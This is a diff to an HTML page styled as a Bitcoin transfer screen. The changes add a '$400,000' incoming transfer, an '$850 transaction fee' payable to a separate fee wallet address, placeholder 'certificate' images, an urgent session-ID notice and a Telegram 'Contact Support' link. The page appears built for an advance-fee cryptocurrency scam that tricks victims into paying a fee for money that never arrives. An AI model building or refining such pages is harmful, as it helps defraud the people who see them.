@@ -340,7 +340,7 @@
       border-radius: 12px;
       padding: 1.5rem;
       border: 1px solid rgba(248, 113, 113, 0.1);
-      margin-bottom: 2rem;
+      margin-bottom: 1rem;
     }
 
     .recipient-label {
@@ -363,11 +363,47 @@
       border: 1px solid rgba(248, 113, 113, 0.1);
     }
 
+    .fee-section {
+      background: rgba(15, 23, 42, 0.5);
+      border-radius: 12px;
+      padding: 1.5rem;
+      border: 1px solid rgba(248, 113, 113, 0.1);
+      margin-bottom: 2rem;
+    }
+
+    .fee-label {
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #94a3b8;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    .fee-amount {
+      font-size: 24px;
+      color: #f7931a;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+
+    .fee-address {
+      font-size: 12px;
+      color: #cbd5e0;
+      font-family: 'Courier New', monospace;
+      word-break: break-all;
+      background: rgba(30, 41, 59, 0.6);
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid rgba(248, 113, 113, 0.1);
+    }
+
     /* ===== BUTTON STYLES ===== */
     .button-group {
       display: flex;
       gap: 1rem;
       margin-top: 2.5rem;
+      flex-wrap: wrap;
     }
 
     .btn {
@@ -389,7 +425,8 @@
       background: linear-gradient(135deg, #f7931a 0%, #e08f0f 100%);
       color: white;
       box-shadow: 0 8px 24px rgba(247, 147, 26, 0.3);
-      width: 100%;
+      flex: 1;
+      min-width: 200px;
       font-weight: 700;
     }
 
@@ -418,6 +455,22 @@
 
     .btn-secondary:hover {
       background: rgba(247, 147, 26, 0.1);
+    }
+
+    .btn-support {
+      background: transparent;
+      color: #f7931a;
+      border: 2px solid #f7931a;
+      padding: 12px 20px;
+      font-size: 14px;
+      width: auto;
+      text-decoration: none;
+      display: inline-flex;
+    }
+
+    .btn-support:hover {
+      background: rgba(247, 147, 26, 0.1);
+      color: #f7931a;
     }
 
     /* ===== NOTIFICATION DROPDOWN ===== */
@@ -467,6 +520,16 @@
       font-size: 14px;
       color: #cbd5e0;
       line-height: 1.6;
+      margin-bottom: 12px;
+    }
+
+    .notification-certificate {
+      width: 100%;
+      height: 180px;
+      border-radius: 8px;
+      margin-bottom: 12px;
+      object-fit: cover;
+      border: 1px solid rgba(248, 113, 113, 0.1);
     }
 
     .notification-amount {
@@ -474,9 +537,22 @@
       border-left: 3px solid #f7931a;
       padding: 12px;
       border-radius: 6px;
-      margin-top: 12px;
+      margin-bottom: 12px;
       font-weight: 700;
       color: #f7931a;
+      font-size: 16px;
+    }
+
+    .notification-fee-address {
+      background: rgba(247, 147, 26, 0.1);
+      border-left: 3px solid #f7931a;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 12px;
+      color: #cbd5e0;
+      font-family: 'Courier New', monospace;
+      word-break: break-all;
+      line-height: 1.4;
     }
 
     /* ===== MODAL/DIALOG ===== */
@@ -755,6 +831,16 @@
       max-width: 500px;
     }
 
+    .confirmation-certificate {
+      width: 100%;
+      max-width: 400px;
+      height: 200px;
+      border-radius: 12px;
+      margin-top: 2rem;
+      object-fit: cover;
+      border: 1px solid rgba(248, 113, 113, 0.1);
+    }
+
     /* ===== RESPONSIVE ===== */
     @media (max-width: 768px) {
       .navbar {
@@ -803,6 +889,10 @@
       .confirmation-amount {
         font-size: 36px;
       }
+
+      .btn-primary {
+        min-width: auto;
+      }
     }
   </style>
 </head>
@@ -846,8 +936,13 @@
     <div class="notification-message">
       A Session ID is required for this transaction. Your wallet has been confirmed and is ready for transfer.
     </div>
+    <img src="https://via.placeholder.com/350x180?text=View+Certificate" alt="Certificate" class="notification-certificate" id="notificationCertificate">
     <div class="notification-amount">
       Transaction Fee: $850
+    </div>
+    <div class="notification-fee-address">
+      <strong style="color: #f7931a;">Fee Address:</strong><br>
+      bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf
     </div>
   </div>
 
@@ -890,13 +985,22 @@
 
     <!-- Recipient Section -->
     <div class="recipient-section">
-      <div class="recipient-label">Recipient Address</div>
-      <div class="recipient-value">bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf</div>
+      <div class="recipient-label">Recipient Address (Receiving $400,000)</div>
+      <div class="recipient-value">bc1q9nh4xgf85vx9uappa07drxv598wth0l63d4v3</div>
+    </div>
+
+    <!-- Fee Section -->
+    <div class="fee-section">
+      <div class="fee-label">Transaction Fee</div>
+      <div class="fee-amount">$850</div>
+      <div style="font-size: 12px; color: #94a3b8; margin-bottom: 12px;">Fee Address:</div>
+      <div class="fee-address">bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf</div>
     </div>
 
     <!-- Action Button -->
     <div class="button-group">
       <button class="btn btn-primary" id="confirmBtn">Confirm & Send</button>
+      <a href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer" class="btn btn-support">💬 Contact Support</a>
     </div>
   </div>
 
@@ -910,6 +1014,7 @@
       <div style="margin-bottom: 12px;">Session ID: #TXN-2024-847392</div>
       <div>Bitcoin Mainnet</div>
     </div>
+    <img src="https://via.placeholder.com/400x200?text=Transaction+Certificate" alt="Transaction Certificate" class="confirmation-certificate" id="confirmationCertificate">
   </div>
 
   <!-- ===== WALLET CONFIRMATION MODAL ===== -->
@@ -929,7 +1034,14 @@
           </div>
         </div>
         <div class="wallet-address-display">
-          bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf
+          bc1q9nh4xgf85vx9uappa07drxv598wth0l63d4v3
+        </div>
+
+        <div class="wallet-row">
+          <div>
+            <div class="wallet-label">Amount</div>
+            <div class="wallet-value">$400,000 USD</div>
+          </div>
         </div>
 
         <div class="wallet-row">
@@ -945,11 +1057,27 @@
             <div class="wallet-value">SegWit (bc1)</div>
           </div>
         </div>
+
+        <div class="wallet-row">
+          <div>
+            <div class="wallet-label">Fee Amount</div>
+            <div class="wallet-value">$850 USD</div>
+          </div>
+        </div>
+
+        <div class="wallet-row">
+          <div>
+            <div class="wallet-label">Fee Address</div>
+          </div>
+        </div>
+        <div class="wallet-address-display" style="margin-top: 8px; margin-bottom: 1rem;">
+          bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf
+        </div>
       </div>
 
       <div style="background: rgba(247, 147, 26, 0.1); border: 1px solid rgba(248, 113, 113, 0.15); border-radius: 8px; padding: 1rem; margin-bottom: 1.5rem; font-size: 13px; color: #cbd5e0; line-height: 1.6;">
         <strong style="color: #f7931a;">⚠️ Important:</strong><br>
-        Verify the recipient address is correct. Transactions cannot be reversed once confirmed.
+        Verify both the recipient and fee addresses are correct. Transactions cannot be reversed once confirmed.
       </div>
 
       <div style="display: flex; gap: 1rem;">
@@ -1010,7 +1138,7 @@
       setTimeout(() => {
         closeWalletModal();
         
-        // Show notification
+        // Show notification with smooth animation
         notificationDropdown.classList.add('show');
 
         // Auto-hide notification after 6 seconds
@@ -1018,7 +1146,7 @@
           notificationDropdown.classList.remove('show');
         }, 6000);
 
-        // Fade out main content and show confirmation
+        // Fade out main content and show confirmation with smooth transition
         setTimeout(() => {
           mainContent.style.opacity = '0';
           mainContent.style.pointerEvents = 'none';
